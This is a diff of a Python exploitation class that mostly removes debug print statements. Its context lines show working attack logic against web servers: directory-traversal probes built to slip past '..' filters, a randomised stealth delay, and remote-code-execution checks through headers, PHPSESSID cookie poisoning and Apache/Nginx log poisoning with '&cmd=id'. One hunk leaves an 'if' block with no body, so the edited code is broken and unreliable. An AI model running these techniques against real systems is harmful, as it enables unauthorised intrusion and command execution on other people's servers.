@@ -56,10 +56,6 @@ class Payload:
         if initiate:
             self.Attack(attempt_shell, mode, force)
 
-        if self.verbosity > 1:
-            print(colored("[DEBUG]", 'blue') + f" Initialized with URL: {self.url} (Type: {type(self.url)})")  # Debugging info
-
-
 
     def InvokeShell(self, exploit, payload):
         # Give some time to bind the listener
@@ -156,8 +152,6 @@ class Payload:
 
     # It sends the url as is without decoding it first, so that it can bypass filters that look for ..
     def hit(self, url):
-        if self.verbosity > 1:
-            print(colored("[DEBUG]", 'blue') + f" Making request to URL: {url} (Type: {type(url)})")  # Debugging info
         if self.stealth:
             time.sleep(random.randint(2,6)) # Sleep for a random interval of seconds (between 2 and 6) per request to be more stealthy
         if self.proxies:
@@ -172,10 +166,6 @@ class Payload:
             if self.cookies is not None:
                 if isinstance(self.cookies, str):  # If cookies is a string
                     self.cookies = self.string_to_dict(self.cookies)  # Convert to dict
-            print(colored("[DEBUG]", 'blue') + f" Ready to url: {url})")
-            print(colored("[DEBUG]", 'yellow') + f" Ready to headers: {self.headers}(Type: {type(self.headers)})")
-            print(colored("[DEBUG]", 'yellow') + f" Ready to cookies: {self.cookies}(Type: {type(self.cookies)})")
-
             if self.creds is not None:
                 response = self.cred(url)
             elif self.headers is not None and self.cookies is not None:
@@ -187,8 +177,6 @@ class Payload:
             else:
                 response = requests.get(url, verify=False)
             response = str(response.text)
-            if response:
-                print(colored("[DEBUG]", 'blue') + f" Got response: {url} (Type: {type(url)})")  # Debugging info
             return self.stripHtmlTags(response)
         
         except HTTPError as e:
@@ -220,8 +208,6 @@ class Payload:
 
 
     def urlCheck(self):
-        if self.verbosity > 1:
-            print(colored("[DEBUG]", 'blue') + f" Checking URL: {self.url} (Type: {type(self.url)})")  # Debugging info
         # Extract the domain with protocol from the provided url
         self.domain = urllib.parse.urlparse(self.url).scheme + '://' + urllib.parse.urlparse(self.url).netloc
         
@@ -293,7 +279,6 @@ class Payload:
                     compUrl = self.url + poc
                 if self.verbosity > 1:
                     print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
-                    print(colored("[DEBUG]", 'blue') + f" Testing Directory Traversal with URL: {compUrl} (Type: {type(compUrl)})")  # Debugging info
                 clean = self.hit(compUrl)
                 if 'root:x' in clean.lower():
                     print(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl)
@@ -314,7 +299,6 @@ class Payload:
             compUrl = self.url + header
             if self.verbosity > 1:
                 print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
-                print(colored("[DEBUG]", 'blue') + f" Testing Directory Traversal with URL: {compUrl} (Type: {type(compUrl)})")  # Debugging info
             clean = self.hit(compUrl)
             if 'uid=' in clean.lower():
                 print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with ' + compUrl)
@@ -376,7 +360,7 @@ class Payload:
                 # open the file to find if the command worked
                 compUrl = self.url + self.cookiePath + value + "&cmd=id"
                 if self.verbosity > 1:
-                    print(colored("[DEBUG]", 'blue') + f" Testing Cookie with URL: {compUrl} (Type: {type(compUrl)})")  # Debugging info
+
                 clean = self.hit(compUrl)	
                 if 'uid='  in clean.lower():
                     print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + self.cookiePath + '[cookie value] can be poisoned')
@@ -450,8 +434,6 @@ class Payload:
             for l_path in logPath:
                 pathth = self.url + d_path + l_path
                 compUrl = pathth + "&cmd=id"
-                if self.verbosity > 1:
-                    print(colored("[DEBUG]", 'blue') + f" Testing Apache Log with URL: {compUrl} (Type: {type(compUrl)})")  # Debugging info
                 clean = self.hit(compUrl)
                 if "uid=" in clean.lower():
                     print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathth)
@@ -475,8 +457,6 @@ class Payload:
             for l_path in log:
                 pathh = self.url + d_path + l_path
                 compUrl = pathh + "&cmd=id"
-                if self.verbosity > 1:
-                    print(colored("[DEBUG]", 'blue') + f" Testing Nginx Log with URL: {compUrl} (Type: {type(compUrl)})")  # Debugging info
                 clean = self.hit(compUrl)
                 if "uid=" in clean.lower():
                     print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathh)
